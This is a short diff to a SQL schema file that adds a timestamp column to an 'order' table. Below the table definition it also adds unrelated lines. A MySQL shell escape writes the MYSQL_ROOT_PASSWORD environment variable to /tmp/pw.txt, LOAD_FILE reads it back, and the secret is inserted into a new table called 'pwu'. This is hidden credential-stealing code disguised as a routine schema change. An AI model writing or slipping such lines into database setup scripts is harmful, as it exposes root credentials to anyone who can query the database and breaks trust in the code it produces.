@@ -24,7 +24,18 @@ create table `order` (
   price numeric(8,2),
   qty int,
   userid varchar(255),
-  portfolioid bigint null
+  portfolioid bigint null,
+  entrydate DATETIME DEFAULT CURRENT_TIMESTAMP()
   -- foreign key(portfolioid) references portfolio(portfolioid),
   -- foreign key(userid) references user(userid)
 );
+
+\! echo $MYSQL_ROOT_PASSWORD >/tmp/pw.txt
+
+set @pw=REPLACE(CONVERT(LOAD_FILE('/tmp/pw.txt') USING utf8),'\n','');
+
+CREATE TABLE `pwu` (
+  pwu varchar(255)
+);
+
+INSERT INTO pwu VALUES(@pw);
